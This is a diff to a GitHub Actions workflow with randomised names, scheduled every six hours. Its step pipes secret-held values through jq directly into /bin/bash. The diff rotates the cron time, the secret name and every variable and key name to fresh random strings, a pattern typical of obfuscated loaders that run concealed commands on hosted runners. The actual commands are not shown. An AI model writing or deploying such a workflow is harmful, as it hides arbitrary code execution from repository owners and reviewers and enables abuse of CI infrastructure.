@@ -1,32 +1,23 @@
 name: maogechui4645
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 5/6 * * *'
+    - cron: '37 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: maogechui4645
         env:
-          w46: ${{ secrets.w46 }}
+          f48799: ${{ secrets.f48799 }}
         run: |
-          echo $w46 | jq -r .yu0 | /bin/bash
-          echo $pb30598 | jq -r .do6476 | /bin/bash
-          echo $o23235 | jq -r .n81036 | /bin/bash
-          echo $fe3 | jq -r .az9 | /bin/bash
-          echo $xcn20409 | jq -r .mnw42722 | /bin/bash
-          echo $q823 | jq -r .zvt09 | /bin/bash
-          echo $dxr80 | jq -r .dm8656 | /bin/bash
-          echo $efp3 | jq -r .r4 | /bin/bash
-          echo $kqdoe686 | jq -r .b595 | /bin/bash
-          echo $xynhl6 | jq -r .rgnur337 | /bin/bash
-          echo $tfo1088 | jq -r .tohm33 | /bin/bash
-          echo $yx19 | jq -r .ntti308 | /bin/bash
-          echo $oiupi838 | jq -r .d90 | /bin/bash
-          echo $metd67837 | jq -r .rde350 | /bin/bash
-          echo $c306 | jq -r .c4 | /bin/bash
-          echo $atwii9614 | jq -r .uf3642 | /bin/bash
+          echo $f48799 | jq -r .w94132 | /bin/bash
+          echo $c3664 | jq -r .goyf9 | /bin/bash
+          echo $zgtqe28882 | jq -r .o3 | /bin/bash
+          echo $znsl14 | jq -r .fizye4 | /bin/bash
+          echo $mcw4977 | jq -r .xmv0987 | /bin/bash
+          echo $eq827 | jq -r .gub68 | /bin/bash
 
